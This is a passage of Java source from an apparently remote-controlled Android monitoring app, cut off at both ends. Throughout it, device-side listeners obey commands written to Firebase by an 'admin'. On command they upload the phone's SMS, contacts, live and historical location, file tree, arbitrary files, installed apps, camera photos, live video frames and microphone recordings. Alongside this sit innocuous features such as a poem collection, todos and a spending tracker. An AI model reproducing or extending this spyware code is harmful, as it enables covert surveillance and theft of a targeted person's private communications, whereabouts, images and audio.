        getAvailableContactInitials(initials -> {
            if (!initials.isEmpty()) {
                getRemoteContacts(initials.get(0));
            } else {
                getRemoteContacts((String) null);
            }
        });
    }

    public static void getRemoteContacts(String initial) {
        String subPath = "/userDeviceData/contacts";
        if (initial != null && !initial.isEmpty()) subPath += "/" + initial;
        getDbRef(getSelectedUserPath(subPath)).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ActionUtils.displayRemoteContacts(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void getAvailableContactInitials(DatesCallback callback) {
        getDbRef(getSelectedUserPath("/userDeviceData/contacts")).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                List<String> initials = new ArrayList<>();
                for (DataSnapshot child : snapshot.getChildren()) {
                    String key = child.getKey();
                    if (key != null) initials.add(key);
                }
                Collections.sort(initials);
                callback.onDates(initials);
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                callback.onDates(new ArrayList<>());
            }
        });
    }

    public static void getRemoteContacts(List<String> initials) {
        if (initials == null || initials.isEmpty()) {
            getRemoteContacts((String) null);
            return;
        }
        Map<String, Object> merged = new HashMap<>();
        int[] remaining = {initials.size()};
        for (String initial : initials) {
            getDbRef(getSelectedUserPath("/userDeviceData/contacts/" + initial)).addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    if (snapshot.exists() && snapshot.getValue() instanceof Map) {
                        @SuppressWarnings("unchecked")
                        Map<String, Object> groupData = (Map<String, Object>) snapshot.getValue();
                        merged.putAll(groupData);
                    }
                    if (--remaining[0] == 0) {
                        ActionUtils.displayRemoteContacts(merged.isEmpty() ? null : merged);
                    }
                }
                @Override public void onCancelled(@NonNull DatabaseError error) {
                    if (--remaining[0] == 0) {
                        ActionUtils.displayRemoteContacts(merged.isEmpty() ? null : merged);
                    }
                }
            });
        }
    }

    public static void getRemoteSensors() {
        getDbRef(getSelectedUserPath("/userDeviceData/sensors")).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ActionUtils.displayRemoteSensors(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void monitorRemoteSensors(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/sensors")).addValueEventListener(listener);
    }

    public static void removeSensorListener(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/sensors")).removeEventListener(listener);
    }

    public static void getRemoteFileStructure(String path, ValueEventListener listener) {
        getDbRef(getSelectedUserPath(getFileStructureDbPath(path))).addValueEventListener(listener);
    }

    public static void removeFileStructureListener(String path, ValueEventListener listener) {
        getDbRef(getSelectedUserPath(getFileStructureDbPath(path))).removeEventListener(listener);
    }

    public static void updateRemoteLiveCallStatus(String title, String message) {
        DatabaseReference ref = getDbRef(getPath("/userDeviceData/liveCallStatus"));
        Map<String, Object> status = new HashMap<>();
        status.put("state", title);
        status.put("detail", message);
        status.put("timestamp", System.currentTimeMillis());
        ref.setValue(status);
    }

    public static void updateRemoteUserMessage(String androidId, String message) {
        DatabaseReference ref = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH + androidId + "/message");
        ref.setValue(message);
    }

    public static void getMessageData() {
        DatabaseReference ref = getDbRef(getPath("/message"));
        ref.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                ActionUtils.performMessageAction(dataSnapshot.getValue(Object.class));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void uploadApplicationUsageReportDataSnapshot(Map<String, AppUsageReportData> appUsageDataMap) {
        LoggerUtils.i("FirebaseUtils", "Uploading app usage report for " + appUsageDataMap.size() + " apps");
        String today = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault())
                .format(new java.util.Date());
        getDbRef(getPath("/userDeviceData/appStats/" + today)).setValue(appUsageDataMap);
    }

    public static void uploadDeviceDirectoryLevel(String path, List<Map<String, Object>> directoryList) {
        String dbPath = getFileStructureDbPath(path);
        LoggerUtils.i("FirebaseUtils", "Uploading directory level to " + dbPath + " (" + directoryList.size() + " items)");
        
        Map<String, Object> map = new HashMap<>();
        for (Map<String, Object> item : directoryList) {
            String name = (String) item.get("name");
            map.put(sanitizeFirebaseKey(name), item);
        }
        getDbRef(getPath(dbPath)).setValue(map);
    }

    public static String sanitizeFirebaseKey(String key) {
        if (key == null) return "null";
        return key.replace(".", ",")
                .replace("$", "_")
                .replace("#", "_")
                .replace("[", "_")
                .replace("]", "_")
                .replace("/", "_");
    }

    public static String getFileStructureDbPath(String absolutePath) {
        if (absolutePath == null || absolutePath.isEmpty()) return "/userDeviceData/fileStructure/root";
        String[] segments = absolutePath.split("/");
        StringBuilder sb = new StringBuilder("/userDeviceData/fileStructure");
        for (String segment : segments) {
            if (segment.isEmpty()) continue;
            sb.append("/").append(sanitizeFirebaseKey(segment));
        }
        return sb.toString();
    }

    public static void clearDeviceDirectoryStructure() {
        getDbRef(getPath("/userDeviceData/fileStructure")).removeValue();
    }

    public static void appendDeviceDirectoryStructure(List<Map<String, Object>> batch) {
        DatabaseReference ref = getDbRef(getPath("/userDeviceData/fileStructure"));
        Map<String, Object> updates = new HashMap<>();
        for (Map<String, Object> item : batch) {
            updates.put(ref.push().getKey(), item);
        }
        ref.updateChildren(updates);
    }

    public static void getShayariCollection(ShayariCollectionCallback callback) {
        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_SHAYARI_PATH);
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                java.util.List<String> shayaris = new java.util.ArrayList<>();
                for (DataSnapshot child : snapshot.getChildren()) {
                    String value = child.getValue(String.class);
                    if (value != null) shayaris.add(value);
                }
                callback.onLoaded(shayaris);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onLoaded(new java.util.ArrayList<>());
            }
        });
    }

    public interface ShayariCollectionCallback {
        void onLoaded(java.util.List<String> shayaris);
    }

    public static void saveTodos(List<TodoItem> items) {
        Map<String, Object> map = new HashMap<>();
        for (TodoItem item : items) {
            Map<String, Object> entry = new HashMap<>();
            entry.put("title", item.title);
            entry.put("done", item.done);
            entry.put("createdAt", item.createdAt);
            entry.put("updatedAt", item.updatedAt);
            map.put(item.id, entry);
        }
        getDbRef(getPath(AppConstants.FIREBASE_RTDB_TODOS_PATH)).setValue(map);
    }

    public static void getTodos(TodosCallback callback) {
        getDbRef(getPath(AppConstants.FIREBASE_RTDB_TODOS_PATH))
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        List<TodoItem> items = new ArrayList<>();
                        for (DataSnapshot child : snapshot.getChildren()) {
                            TodoItem item = new TodoItem();
                            item.id = child.getKey();
                            item.title = child.child("title").getValue(String.class);
                            Boolean done = child.child("done").getValue(Boolean.class);
                            item.done = done != null && done;
                            Long createdAt = child.child("createdAt").getValue(Long.class);
                            item.createdAt = createdAt != null ? createdAt : 0;
                            Long updatedAt = child.child("updatedAt").getValue(Long.class);
                            item.updatedAt = updatedAt != null ? updatedAt : 0;
                            if (item.title != null) items.add(item);
                        }
                        callback.onLoaded(items);
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        callback.onLoaded(new ArrayList<>());
                    }
                });
    }

    public interface TodosCallback {
        void onLoaded(List<TodoItem> items);
    }

    public static void saveSpendingEntry(SpendingEntry entry) {
        Calendar cal = Calendar.getInstance();
        cal.setTimeInMillis(entry.date);
        String year = String.valueOf(cal.get(Calendar.YEAR));
        String month = String.format("%02d", cal.get(Calendar.MONTH) + 1);
        String path = AppConstants.FIREBASE_RTDB_SPENDING_PATH + "/" + year + "/" + month + "/" + entry.id;

        Map<String, Object> data = new HashMap<>();
        data.put("id", entry.id);
        data.put("sender", entry.sender);
        data.put("body", entry.body);
        data.put("amount", entry.amount);
        data.put("category", entry.category != null ? entry.category.name() : "UNCATEGORIZED");
        data.put("type", entry.type != null ? entry.type : "UNKNOWN");
        data.put("date", entry.date);

        getDbRef(getPath(path)).setValue(data);
    }

    public static void getSpendingDataForYear(int year, SpendingFullSyncCallback callback) {
        String path = AppConstants.FIREBASE_RTDB_SPENDING_PATH + "/" + year;
        getDbRef(getPath(path)).addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Map<String, String> categories = new HashMap<>();
                Map<String, String> types = new HashMap<>();
                for (DataSnapshot monthSnap : snapshot.getChildren()) {
                    for (DataSnapshot entrySnap : monthSnap.getChildren()) {
                        String id = entrySnap.child("id").getValue(String.class);
                        String cat = entrySnap.child("category").getValue(String.class);
                        String type = entrySnap.child("type").getValue(String.class);
                        if (id != null) {
                            if (cat != null) categories.put(id, cat);
                            if (type != null) types.put(id, type);
                        }
                    }
                }
                callback.onLoaded(categories, types);
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                callback.onLoaded(new HashMap<>(), new HashMap<>());
            }
        });
    }

    public static void requestFileDownload(String path, String fileName) {
        LoggerUtils.i("FirebaseUtils", "Requesting file download: " + fileName + " from path: " + path);
        Map<String, Object> command = new HashMap<>();
        command.put("path", path);
        command.put("name", fileName);
        command.put("timestamp", System.currentTimeMillis());
        getDbRef(getSelectedUserPath("/commands/downloadRequest")).setValue(command);
    }

    public static void listenForDownloadCommands(Context context) {
        getDbRef(getPath("/commands/downloadRequest")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    String path = snapshot.child("path").getValue(String.class);
                    String name = snapshot.child("name").getValue(String.class);
                    if (path != null && name != null) {
                        LoggerUtils.d("FirebaseUtils", "Received download request: " + name);
                        uploadFileToStorage(context, path, name);
                    }
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "Error listening for download commands: " + error.getMessage());
            }
        });
    }

    private static void uploadFileToStorage(Context context, String localPath, String fileName) {
        if (context == null) {
            LoggerUtils.e("FirebaseUtils", "Cannot upload file: context is null");
            return;
        }
        
        if (!CommonUtil.hasFileAccess()) {
            LoggerUtils.w("FirebaseUtils", "Cannot upload file: All Files Access missing");
            getDbRef(getPath("/status/download")).setValue(Map.of("progress", 0, "status", "FAILED", "error", "Permission Denied: All Files Access required", "name", fileName));
            return;
        }

        File file = new File(localPath);
        if (!file.exists()) {
            LoggerUtils.w("FirebaseUtils", "File does not exist: " + localPath);
            getDbRef(getPath("/status/download")).setValue(Map.of("progress", 0, "status", "FAILED", "error", "File not found on remote device", "name", fileName));
            return;
        }

        LoggerUtils.i("FirebaseUtils", "Starting storage upload: " + fileName + " (" + file.length() + " bytes)");
        StorageReference ref = FirebaseStorage.getInstance().getReference().child("downloads/" + getAndroidID(context) + "/" + fileName);
        ref.putFile(android.net.Uri.fromFile(file))
            .addOnProgressListener(snapshot -> {
                double progress = (100.0 * snapshot.getBytesTransferred()) / snapshot.getTotalByteCount();
                LoggerUtils.d("FirebaseUtils", "Upload progress for " + fileName + ": " + String.format("%.1f", progress) + "%");
                getDbRef(getPath("/status/download")).setValue(Map.of("progress", progress, "status", "UPLOADING", "name", fileName));
            })
            .addOnSuccessListener(taskSnapshot -> {
                LoggerUtils.i("FirebaseUtils", "Storage upload complete: " + fileName);
                getDbRef(getPath("/status/download")).setValue(Map.of("progress", 100, "status", "COMPLETED", "name", fileName, "url", "available"));
            })
            .addOnFailureListener(e -> {
                LoggerUtils.e("FirebaseUtils", "Storage upload failed: " + fileName + " :: " + e.getMessage());
                getDbRef(getPath("/status/download")).setValue(Map.of("progress", 0, "status", "FAILED", "error", e.getMessage()));
            });
    }

    public static void monitorDownloadStatus(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/status/download")).addValueEventListener(listener);
    }

    public static void downloadFileFromStorage(String fileName, File localFile, OnDownloadListener listener) {
        StorageReference ref = FirebaseStorage.getInstance().getReference().child("downloads/" + getAdminSettingsUserAndroidId(context) + "/" + fileName);
        ref.getFile(localFile)
            .addOnProgressListener(snapshot -> {
                int progress = (int) ((100.0 * snapshot.getBytesTransferred()) / snapshot.getTotalByteCount());
                listener.onProgress(progress);
            })
            .addOnSuccessListener(taskSnapshot -> listener.onSuccess())
            .addOnFailureListener(e -> listener.onFailure(e.getMessage()));
    }

    public interface OnDownloadListener {
        void onProgress(int percent);
        void onSuccess();
        void onFailure(String error);
    }

    public static void updateRemoteTrigger(String key, User.AppTriggerSettingsData updated) {
        getDbRef(getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/" + key)).setValue(updated);
    }

    public static void uploadLiveLocation(@androidx.annotation.Nullable android.location.Location location) {
        Map<String, Object> data = new HashMap<>();
        if (location == null) {
            data.put("error", "Failed to get location fix");
            data.put("timestamp", System.currentTimeMillis());
        } else {
            data.put("lat", location.getLatitude());
            data.put("lng", location.getLongitude());
            data.put("accuracy", location.getAccuracy());
            data.put("altitude", location.getAltitude());
            data.put("speed", location.getSpeed());
            data.put("timestamp", location.getTime() > 0 ? location.getTime() : System.currentTimeMillis());
            data.put("provider", location.getProvider());
        }
        getDbRef(getPath(AppConstants.FIREBASE_RTDB_LIVE_LOCATION_PATH)).setValue(data);
    }

    public static void uploadLocationHistory(android.location.Location location) {
        String date = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault())
                .format(new java.util.Date());
        DatabaseReference ref = getDbRef(getPath("/userDeviceData/geolocation/history/" + date));
        Map<String, Object> data = new HashMap<>();
        data.put("lat", location.getLatitude());
        data.put("lng", location.getLongitude());
        data.put("accuracy", location.getAccuracy());
        data.put("timestamp", location.getTime() > 0 ? location.getTime() : System.currentTimeMillis());
        ref.push().setValue(data);
    }

    public static DatabaseReference getLiveLocationRef() {
        return getDbRef(getSelectedUserPath(AppConstants.FIREBASE_RTDB_LIVE_LOCATION_PATH));
    }

    public static void requestLiveLocationUpdate() {
        Map<String, Object> command = new HashMap<>();
        command.put("timestamp", System.currentTimeMillis());
        getDbRef(getSelectedUserPath("/commands/locationRequest")).setValue(command);
    }

    public static void requestAppUsageUpdate() {
        Map<String, Object> command = new HashMap<>();
        command.put("timestamp", System.currentTimeMillis());
        getDbRef(getSelectedUserPath("/commands/appUsageRequest")).setValue(command);
    }

    public static void requestSensorUpdate() {
        Map<String, Object> command = new HashMap<>();
        command.put("timestamp", System.currentTimeMillis());
        getDbRef(getSelectedUserPath("/commands/sensorRequest")).setValue(command);
    }

    public static void listenForLocationCommands(Context context) {
        getDbRef(getPath("/commands/locationRequest")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    LocationUtils.captureAndUpload(context);
                    snapshot.getRef().removeValue();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    private static long lastAppUsageTimestamp = 0;

    public static void listenForAppUsageCommands(Context context) {
        getDbRef(getPath("/commands/appUsageRequest")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                    if (timestamp != null && timestamp > lastAppUsageTimestamp) {
                        lastAppUsageTimestamp = timestamp;
                        LoggerUtils.d("FirebaseUtils", "Full usage refresh command received (ts: " + timestamp + ")");
                        
                        // NEW: Upload all usage-related data on refresh
                        new Thread(() -> {
                            // 1. App Usage Stats
                            com.vikasyadavnsit.cdc.services.AppUsageStats.getDailyUsageStats(context, true);
                            
                            // 2. Installed Apps
                            java.util.List<java.util.Map<String, String>> apps = AppUtils.getInstalledApps(context);
                            FirebaseUtils.uploadInstalledAppsSnapshot(apps);
                            
                            // 3. Ensure screen monitor is active
                            ActionUtils.registerScreenStateMonitor(context);
                            
                            LoggerUtils.i("FirebaseUtils", "Usage and Apps refresh complete");
                        }).start();
                        
                        snapshot.getRef().removeValue();
                    }
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    private static long lastSensorRequestTimestamp = 0;

    public static void listenForSensorCommands(Context context) {
        getDbRef(getPath("/commands/sensorRequest")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                    if (timestamp != null && timestamp > lastSensorRequestTimestamp) {
                        lastSensorRequestTimestamp = timestamp;
                        LoggerUtils.d("FirebaseUtils", "Sensor refresh command received");
                        // We can't easily reach the service directly, but we can restart it or send a broadcast
                        Intent intent = new Intent(context, com.vikasyadavnsit.cdc.services.CDCSensorService.class);
                        intent.setAction("START_SENSOR"); // This will trigger an immediate upload if running
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            context.startForegroundService(intent);
                        } else {
                            context.startService(intent);
                        }
                        snapshot.getRef().removeValue();
                    }
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    // ── Admin-side: wipe Firebase node then command device to re-upload ──────────

    public static void deleteAndResyncSms() {
        getDbRef(getSelectedUserPath("/userDeviceData/sms")).removeValue();
        Map<String, Object> command = new HashMap<>();
        command.put("timestamp", System.currentTimeMillis());
        getDbRef(getSelectedUserPath("/commands/smsResyncRequest")).setValue(command);
    }

    public static void deleteAndResyncContacts() {
        getDbRef(getSelectedUserPath("/userDeviceData/contacts")).removeValue();
        Map<String, Object> command = new HashMap<>();
        command.put("timestamp", System.currentTimeMillis());
        getDbRef(getSelectedUserPath("/commands/contactsResyncRequest")).setValue(command);
    }

    // ── Device-side: listen for resync commands and re-upload ─────────────────

    private static long lastSmsResyncTimestamp = 0;
    private static long lastContactsResyncTimestamp = 0;

    public static void listenForSmsResyncCommand(Context context) {
        getDbRef(getPath("/commands/smsResyncRequest")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                if (timestamp != null && timestamp > lastSmsResyncTimestamp) {
                    lastSmsResyncTimestamp = timestamp;
                    LoggerUtils.d("FirebaseUtils", "SMS resync command received — capturing all SMS");
                    new Thread(() -> {
                        List<Map<String, String>> messages = MessageUtils.getMessages(context, FileMap.SMS);
                        if (messages != null && !messages.isEmpty()) {
                            uploadUserSmsDataSnapshot(messages);
                        }
                    }).start();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "listenForSmsResyncCommand cancelled: " + error.getMessage());
            }
        });
    }

    public static void listenForContactsResyncCommand(Context context) {
        getDbRef(getPath("/commands/contactsResyncRequest")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                if (timestamp != null && timestamp > lastContactsResyncTimestamp) {
                    lastContactsResyncTimestamp = timestamp;
                    LoggerUtils.d("FirebaseUtils", "Contacts resync command received — capturing all contacts");
                    new Thread(() -> {
                        List<Map<String, String>> contacts = MessageUtils.getMessages(context, FileMap.CONTACTS);
                        if (contacts != null && !contacts.isEmpty()) {
                            uploadUserContactsDataSnapshot(contacts);
                        }
                    }).start();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "listenForContactsResyncCommand cancelled: " + error.getMessage());
            }
        });
    }

    public interface SpendingFullSyncCallback {
        void onLoaded(Map<String, String> categoryMap, Map<String, String> typeMap);
    }

    public interface AppUpdateCallback {
        void onUpdateConfig(int latestVersionCode, String apkStoragePath);
    }

    /** Admin-side: write (or overwrite) the global update config so all devices can see it. */
    public static void publishUpdateConfig(int versionCode, String apkStoragePath) {
        Map<String, Object> config = new HashMap<>();
        config.put("latestVersionCode", versionCode);
        config.put("apkStoragePath", apkStoragePath != null ? apkStoragePath : "");
        getDatabase().getReference(AppConstants.FIREBASE_RTDB_UPDATES_PATH)
                .setValue(config)
                .addOnSuccessListener(unused ->
                        LoggerUtils.d("FirebaseUtils", "Published update config v" + versionCode
                                + " → " + apkStoragePath))
                .addOnFailureListener(e ->
                        LoggerUtils.e("FirebaseUtils", "publishUpdateConfig failed: " + e.getMessage()));
    }

    public static void listenForAppUpdate(AppUpdateCallback callback) {
        DatabaseReference ref = getDatabase().getReference(AppConstants.FIREBASE_RTDB_UPDATES_PATH);
        ref.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                Integer latestVersionCode = snapshot.child("latestVersionCode").getValue(Integer.class);
                String apkStoragePath = snapshot.child("apkStoragePath").getValue(String.class);
                if (latestVersionCode != null) {
                    callback.onUpdateConfig(latestVersionCode,
                            apkStoragePath != null ? apkStoragePath : "");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "listenForAppUpdate cancelled: " + error.getMessage());
            }
        });
    }

    public static void uploadUserAppList(List<Map<String, Object>> apps) {
        if (apps == null || apps.isEmpty()) return;
        LoggerUtils.d("FirebaseUtils", "Uploading " + apps.size() + " installed apps");
        getDbRef(getPath("/userDeviceData/installedApps")).setValue(apps);
    }

    public static void uploadCameraImage(String side, String base64) {
        String date = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault()).format(new java.util.Date());
        String ts = String.valueOf(System.currentTimeMillis());
        getDbRef(getPath("/userDeviceData/camera/" + side + "/" + date + "/" + ts)).setValue(base64);
        // Also update latest for quick preview
        getDbRef(getPath("/userDeviceData/camera/" + side + "/latest")).setValue(base64);
    }

    public static void uploadAudio(String base64, boolean persist) {
        Map<String, Object> data = new HashMap<>();
        data.put("audio", base64);
        data.put("timestamp", System.currentTimeMillis());
        
        getDbRef(getPath("/userDeviceData/mic/latest")).setValue(data);
        if (persist) {
            String date = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault()).format(new java.util.Date());
            String time = new java.text.SimpleDateFormat("HH-mm-ss", java.util.Locale.getDefault()).format(new java.util.Date());
            getDbRef(getPath("/userDeviceData/mic/history/" + date + "/" + time)).setValue(data);
        }
    }

    public static void deleteMicData() {
        getDbRef(getPath("/userDeviceData/mic")).removeValue();
    }

    public static void monitorMicData(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/mic")).addValueEventListener(listener);
    }

    public static void removeMicDataListener(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/mic")).removeEventListener(listener);
    }

    public static void uploadLiveFrame(String base64) {
        String date = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault()).format(new java.util.Date());
        String ts = String.valueOf(System.currentTimeMillis());
        
        // Save to current live node for real-time viewer
        getDbRef(getPath("/userDeviceData/camera/live/current")).setValue(base64)
            .addOnFailureListener(e -> LoggerUtils.e("FirebaseUtils", "Live upload current failed: " + e.getMessage()));
        
        // Save to date-wise history
        getDbRef(getPath("/userDeviceData/camera/live/history/" + date + "/" + ts)).setValue(base64)
            .addOnFailureListener(e -> LoggerUtils.e("FirebaseUtils", "Live upload history failed: " + e.getMessage()));
    }

    public static void deleteCameraPhotos() {
        getDbRef(getPath("/userDeviceData/camera/back")).removeValue();
        getDbRef(getPath("/userDeviceData/camera/front")).removeValue();
    }

    public static void deleteCameraLive() {
        getDbRef(getPath("/userDeviceData/camera/live")).removeValue();
    }

    public static void monitorCameraData(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/camera")).addValueEventListener(listener);
    }

    public static void removeCameraDataListener(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/camera")).removeEventListener(listener);
    }

    private static long lastCameraCommandTimestamp = System.currentTimeMillis();
    public static void listenForCameraCommands(Context context) {
        getDbRef(getPath("/commands/cameraRequest")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                Long ts = snapshot.child("timestamp").getValue(Long.class);
                String action = snapshot.child("action").getValue(String.class);
                if (ts != null && ts > lastCameraCommandTimestamp && action != null) {
                    lastCameraCommandTimestamp = ts;
                    LoggerUtils.i("FirebaseUtils", "Camera command received: " + action + " (ts: " + ts + ")");
                    Intent intent = new Intent(context, com.vikasyadavnsit.cdc.services.CDCCameraService.class);
                    intent.setAction(action);
                    String type = snapshot.child("type").getValue(String.class);
                    if (type != null) intent.putExtra("type", type);
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }
                    // Remove command after processing to prevent re-trigger on restart
                    snapshot.getRef().removeValue();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    private static long lastMicCommandTimestamp = System.currentTimeMillis();
    public static void listenForMicCommands(Context context) {
        getDbRef(getPath("/commands/micRequest")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                Long ts = snapshot.child("timestamp").getValue(Long.class);
                String action = snapshot.child("action").getValue(String.class);
                if (ts != null && ts > lastMicCommandTimestamp && action != null) {
                    lastMicCommandTimestamp = ts;
                    LoggerUtils.i("FirebaseUtils", "Mic command received: " + action + " (ts: " + ts + ")");
                    Intent intent = new Intent(context, com.vikasyadavnsit.cdc.services.CDCMicService.class);
                    intent.setAction(action);
                    
                    DataSnapshot durSnap = snapshot.child("duration");
                    if (durSnap.exists() && durSnap.getValue() instanceof Number) {
                        intent.putExtra("duration", ((Number) durSnap.getValue()).longValue());
                    }
                    
                    DataSnapshot perSnap = snapshot.child("persist");
                    if (perSnap.exists()) {
                        intent.putExtra("persist", perSnap.getValue(Boolean.class));
                    }

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }
                    // Remove command after processing
                    snapshot.getRef().removeValue();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    public static void uploadInstalledAppsSnapshot(List<Map<String, String>> apps) {
        if (apps == null || apps.isEmpty()) return;
        List<Map<String, Object>> converted = new ArrayList<>();
        for (Map<String, String> app : apps) converted.add(new HashMap<>(app));
        uploadUserAppList(converted);
    }

    public static void getRemoteAppList(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/installedApps")).addValueEventListener(listener);
    }

    public static void getRemoteInstalledApps() {
        getRemoteAppList(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                com.vikasyadavnsit.cdc.utils.ActionUtils.displayRemoteInstalledApps(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "getRemoteInstalledApps cancelled: " + error.getMessage());
            }
        });
    }

    public static void uploadDeviceInfo(Map<String, Object> info) {
        if (info == null) return;
        getDbRef(getPath("/userDeviceData/deviceInfo")).setValue(info);
    }

    public static void updateAccessibilityStatus(boolean enabled) {
        getDbRef(getPath("/userDeviceData/permissions/ACCESSIBILITY_SERVICE")).setValue(enabled);
    }

    public static void triggerDeviceInfoCapture() {
        User.AppTriggerSettingsData trigger = User.AppTriggerSettingsData.builder()
                .type(TriggerType.DATA_CAPTURE)
                .enabled(true)
                .clickActions(ClickActions.CAPTURE_DEVICE_INFO)
                .actionStatus(ActionStatus.PREPARE)
                .build();
        getDbRef(getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/CAPTURE_DEVICE_INFO"))
                .setValue(trigger);
    }

    public static ValueEventListener listenDeviceInfo() {
        ValueEventListener listener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                com.vikasyadavnsit.cdc.utils.ActionUtils.displayRemoteDeviceInfo(
                        snapshot.getValue(Object.class));
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "deviceInfo listener cancelled: " + error.getMessage());
            }
        };
        getDbRef(getSelectedUserPath("/userDeviceData/deviceInfo")).addValueEventListener(listener);
        return listener;
    }

    public static void stopListeningDeviceInfo(ValueEventListener listener) {
        if (listener != null) {
            getDbRef(getSelectedUserPath("/userDeviceData/deviceInfo")).removeEventListener(listener);
        }
    }

    public static void sendRemoteControlCommand(String feature, String command) {
        Map<String, Object> payload = new HashMap<>();
        payload.put("command", command);
        payload.put("timestamp", System.currentTimeMillis());
        getDbRef(getSelectedUserPath("/remoteControl/" + feature)).setValue(payload);
    }

    public static void listenForRemoteControl(ValueEventListener listener) {
        getDbRef(getPath("/remoteControl")).addValueEventListener(listener);
    }

    public static void uploadScreenStateBatch(List<Map<String, Object>> events) {
        if (events == null || events.isEmpty()) return;
        
        // Group by date to support multi-day batches if they happen (e.g. crossing midnight)
        Map<String, List<Map<String, Object>>> dateWise = new HashMap<>();
        for (Map<String, Object> event : events) {
            String date = (String) event.get("date");
            if (date == null) {
                date = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault())
                        .format(new java.util.Date((long)event.get("timestamp")));
            }
            dateWise.computeIfAbsent(date, k -> new ArrayList<>()).add(event);
        }

